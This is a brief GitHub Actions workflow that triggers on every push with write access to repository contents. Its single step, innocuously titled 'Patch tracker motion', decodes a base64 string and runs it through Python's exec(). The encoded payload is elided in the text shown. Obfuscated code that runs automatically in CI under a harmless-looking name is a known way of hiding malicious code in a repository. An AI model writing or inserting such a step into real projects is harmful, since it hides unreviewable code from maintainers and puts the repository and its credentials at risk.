name: Reshape top tracker

on: [push]

permissions:
  contents: write

jobs:
  patch:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Patch tracker motion
        shell: bash
        run: |
          python3 -c "import base64;exec(base64.b64decode('...TRUNCATED...'))"